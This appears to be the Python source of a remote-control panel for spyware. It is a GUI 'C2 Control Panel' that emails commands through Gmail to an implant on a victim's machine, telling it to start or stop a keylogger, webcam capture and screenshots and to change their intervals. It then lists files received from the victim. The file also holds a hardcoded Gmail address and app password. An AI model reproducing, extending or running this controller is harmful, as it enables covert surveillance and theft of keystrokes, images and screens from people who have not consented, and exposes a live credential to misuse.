import smtplib
import threading
import time
import customtkinter as ctk
from datetime import datetime
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import uuid

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class EmailC2:
    def __init__(self):
        self.sender_email = 'romanbogdan475@gmail.com'
        self.sender_password = 'cxzv ddop qosk hvdy'
        self.smtp_server = 'smtp.gmail.com'
        self.smtp_port = 587

    def send_command(self, command):
        try:
            command_id = str(uuid.uuid4())[:8]
            full_command = f"{command}|ID:{command_id}"

            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.sender_email
            msg['Subject'] = f"COMMAND: {full_command}"
            msg.attach(MIMEText(f"Command: {full_command}\nSent at: {datetime.now()}", 'plain'))

            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.send_message(msg)

            print(f"[+] Comandă trimisă: {command}")
            return True
        except Exception as e:
            print(f"[-] Eroare trimitere: {e}")
            return False


class C2GUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("C2 Control Panel - Email v2.1")
        self.geometry("900x860")
        self.c2 = EmailC2()
        self.create_widgets()
        self.check_received_periodically()

    def create_widgets(self):
        ctk.CTkLabel(self, text="C2 Control Panel", 
                     font=ctk.CTkFont(size=28, weight="bold")).pack(pady=20)

        self.status_label = ctk.CTkLabel(self, text="Ready", 
                                         font=ctk.CTkFont(size=14))
        self.status_label.pack(pady=10)

        self.scroll_frame = ctk.CTkScrollableFrame(self)
        self.scroll_frame.pack(pady=10, padx=20, fill="both", expand=True)

        # Recipient
        recipient_frame = ctk.CTkFrame(self.scroll_frame)
        recipient_frame.pack(pady=10, padx=20, fill="x")
        ctk.CTkLabel(recipient_frame, text="Adresă Victimă:", 
                     font=ctk.CTkFont(size=14)).pack(pady=(10,5))
        self.recipient_entry = ctk.CTkEntry(recipient_frame, height=40, 
                                           placeholder_text="victima@gmail.com")
        self.recipient_entry.pack(pady=5, padx=20, fill="x")
        ctk.CTkButton(recipient_frame, text="Set Recipient", height=40, 
                      fg_color="orange", command=self.set_recipient).pack(pady=10)

        # Intervals
        interval_frame = ctk.CTkFrame(self.scroll_frame)
        interval_frame.pack(pady=10, padx=20, fill="x")
        ctk.CTkLabel(interval_frame, text="Set Intervals", 
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=(10,5))

        self.interval_type = ctk.CTkComboBox(interval_frame, values=[
            "Keylogger Interval", "Camera Interval", 
            "Screenshot Interval", "Check Interval"
        ])
        self.interval_type.set("Keylogger Interval")
        self.interval_type.pack(pady=5, padx=20, fill="x")

        self.interval_entry = ctk.CTkEntry(interval_frame, height=40, 
                                           placeholder_text="Secunde (min 5)")
        self.interval_entry.pack(pady=5, padx=20, fill="x")

        ctk.CTkButton(interval_frame, text="Set Interval", height=40, 
                      fg_color="teal", command=self.set_specific_interval).pack(pady=10)

        # Action Buttons
        btn_frame = ctk.CTkFrame(self.scroll_frame)
        btn_frame.pack(pady=20, padx=20, fill="x")

        buttons = [
            ("▶ Start Keylogger", "green", "START_KEYLOGGER"),
            ("■ Stop Keylogger", "red", "STOP_KEYLOGGER"),
            ("📸 Start Webcam", "green", "START_CAMERA"),
            ("■ Stop Webcam", "red", "STOP_CAMERA"),
            ("📸 Take Screenshot", "blue", "TAKE_SCREENSHOT"),
            ("▶ Start Auto Screenshot", "green", "START_SCREENSHOT"),
            ("■ Stop Auto Screenshot", "red", "STOP_SCREENSHOT"),
        ]

        for text, color, cmd in buttons:
            btn = ctk.CTkButton(btn_frame, text=text, height=50, fg_color=color,
                                command=lambda c=cmd: self.send_command(c))
            btn.pack(pady=6, fill="x")

        # Received Files
        files_frame = ctk.CTkFrame(self.scroll_frame)
        files_frame.pack(pady=20, padx=20, fill="both", expand=True)
        ctk.CTkLabel(files_frame, text="Fișiere Primite:", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)

        self.files_textbox = ctk.CTkTextbox(files_frame, height=300)
        self.files_textbox.pack(fill="both", expand=True, padx=15, pady=10)

        self.update_files_display()

    def set_recipient(self):
        email = self.recipient_entry.get().strip()
        if email and "@" in email:
            self.c2.send_command(f"SET_RECIPIENT:{email}")
            self.status_label.configure(text=f"✅ Recipient set: {email}")
        else:
            self.status_label.configure(text="❌ Adresă invalidă!")

    def set_specific_interval(self):
        value = self.interval_entry.get().strip()
        interval_type = self.interval_type.get()
        if not value:
            self.status_label.configure(text="❌ Introdu un interval!")
            return
        try:
            interval = int(value)
            if interval < 5:
                self.status_label.configure(text="❌ Minim 5 secunde!")
                return

            mapping = {
                "Keylogger Interval": "SET_KEY_INTERVAL",
                "Camera Interval": "SET_CAMERA_INTERVAL",
                "Screenshot Interval": "SET_SCREENSHOT_INTERVAL",
                "Check Interval": "SET_CHECK_INTERVAL"
            }
            self.c2.send_command(f"{mapping[interval_type]}:{interval}")
            self.status_label.configure(text=f"✅ {interval_type} setat la {interval}s")
        except ValueError:
            self.status_label.configure(text="❌ Valoare numerică invalidă!")

    def send_command(self, command):
        self.status_label.configure(text=f"📤 Se trimite: {command} ...")
        success = self.c2.send_command(command)
        if success:
            self.status_label.configure(text=f"✅ Trimis: {command}")
        else:
            self.status_label.configure(text="❌ Eroare la trimitere")

    def update_files_display(self):
        self.files_textbox.delete("1.0", "end")
        folder = "received_from_victim"
        if os.path.exists(folder):
            files = os.listdir(folder)
            if files:
                for f in sorted(files, reverse=True):
                    self.files_textbox.insert("end", f"📄 {f}\n")
            else:
                self.files_textbox.insert("end", "Niciun fișier primit încă...\n")
        else:
            self.files_textbox.insert("end", "Folder 'received_from_victim' inexistent.\n")

    def check_received_periodically(self):
        def loop():
            while True:
                self.update_files_display()
                time.sleep(20)
        threading.Thread(target=loop, daemon=True).start()


if __name__ == "__main__":
    app = C2GUI()
    app.mainloop()